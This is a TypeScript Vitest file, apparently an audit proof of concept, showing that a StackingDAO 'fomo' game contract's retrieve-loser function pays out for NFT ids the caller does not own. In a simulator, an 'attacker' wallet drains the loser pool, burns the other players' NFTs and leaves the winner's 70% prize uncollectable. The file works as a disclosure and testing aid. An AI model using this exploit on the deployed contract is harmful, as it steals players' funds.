import { describe, expect, it } from "vitest";
import { Cl } from "@stacks/transactions";
import { qualifiedName } from "../wrappers/tests-utils";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const w1 = accounts.get("wallet_1")!;
const w2 = accounts.get("wallet_2")!;
const w3 = accounts.get("wallet_3")!;
const attacker = accounts.get("wallet_8")!; // holds no claim, ever

const M = 1_000_000;

function ststx(owner: string): bigint {
  const r: any = simnet.callReadOnlyFn("ststx-token", "get-balance", [Cl.principal(owner)], deployer).result;
  return BigInt(r.value.value);
}

function u(r: any): bigint {
  return BigInt(r.value);
}

function deposit(who: string, amountStx: number) {
  return simnet.callPublicFn(
    "stacking-dao-core-v6",
    "deposit",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("commission-v2")),
      Cl.principal(qualifiedName("staking-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amountStx * M),
      Cl.none(),
      Cl.none(),
    ],
    who,
  ).result;
}

const buy = (who: string) => simnet.callPublicFn("fomo", "buy-claim", [], who).result;
const loser = (who: string, id: number) =>
  simnet.callPublicFn("fomo", "retrieve-loser", [Cl.uint(id)], who).result;

describe("FOMO retrieve-loser", () => {
  it("drains the loser pool with ids the caller does not own, and bricks the winner", () => {
    expect(simnet.callPublicFn("fomo", "start-game", [], deployer).result).toBeOk(Cl.bool(true));
    // the seeded 100 stSTX "grand prize" is virtual: nothing backs it in the contract.
    // zero it so this PoC measures only what users actually paid in.
    expect(simnet.callPublicFn("fomo", "set-total-treasure", [Cl.uint(0)], deployer).result).toBeOk(
      Cl.bool(true),
    );

    deposit(w1, 10);
    deposit(w2, 10);
    deposit(w3, 10);

    expect(buy(w1)).toBeOk(Cl.bool(true)); // token 0, pays 1.1
    expect(buy(w2)).toBeOk(Cl.bool(true)); // token 1, pays 1.2
    expect(buy(w3)).toBeOk(Cl.bool(true)); // token 2, pays 1.3  <- master key holder

    const treasure = u(simnet.callReadOnlyFn("fomo", "get-total-treasure", [], deployer).result);
    const loserPool = (treasure * 2500n) / 10000n;
    const winnerPrize = (treasure * 7000n) / 10000n;
    const nftAmount = 3n; // three buy-claim calls above; there is no getter for it
    const perCall = loserPool / (nftAmount - 1n);

    simnet.mineEmptyBurnBlocks(200);
    expect(simnet.callReadOnlyFn("fomo", "has-game-ended", [], deployer).result).toBeBool(true);

    expect(ststx(attacker)).toBe(0n);
    const contractStstx = ststx(qualifiedName("fomo"));

    // the attacker owns none of ids 0,1,2 and holds no claim
    const paid: bigint[] = [];
    for (const id of [0, 1, 2]) {
      const r = loser(attacker, id);
      expect(r).toBeOk(Cl.uint(Number(perCall)));
      paid.push(perCall);
    }
    const stolen = paid.reduce((a, b) => a + b, 0n);

    console.log("treasure         ", treasure.toString());
    console.log("loser pool (25%) ", loserPool.toString());
    console.log("per call         ", perCall.toString());
    console.log("attacker received", stolen.toString());
    console.log("attacker stSTX   ", ststx(attacker).toString());
    console.log("fomo stSTX before", contractStstx.toString());
    console.log("fomo stSTX after ", ststx(qualifiedName("fomo")).toString());

    // 1. the attacker, who never bought a claim, took three slices of the pool
    expect(ststx(attacker)).toBe(stolen);
    expect(stolen).toBeGreaterThan(loserPool);

    // 2. the NFTs are gone: their owners no longer hold them
    for (const id of [0, 1, 2]) {
      const owner: any = simnet.callReadOnlyFn(
        "stacking-dao-fomo-nft",
        "get-owner",
        [Cl.uint(id)],
        deployer,
      ).result;
      expect(owner.value.type).toBe(9); // OptionalNone
      expect(simnet.callReadOnlyFn("stacking-dao-fomo-nft", "get-owner", [Cl.uint(id)], deployer).result)
        .toBeOk(Cl.none());
    }

    // 3. the master key holder can no longer collect the 70%
    const win = simnet.callPublicFn("fomo", "retrieve-winner", [Cl.uint(2)], w3).result;
    console.log("retrieve-winner  ", JSON.stringify(win));
    // the 70% transfer runs BEFORE the burn and fails: only 2 250 000 of the
    // 2 520 000 prize is still in the contract
    expect(win).toBeErr(Cl.uint(1));

    // 4. what is left in the contract can no longer cover the winner prize
    expect(ststx(qualifiedName("fomo"))).toBeLessThan(winnerPrize);
    console.log("short by         ", (winnerPrize - ststx(qualifiedName("fomo"))).toString());
  });
});
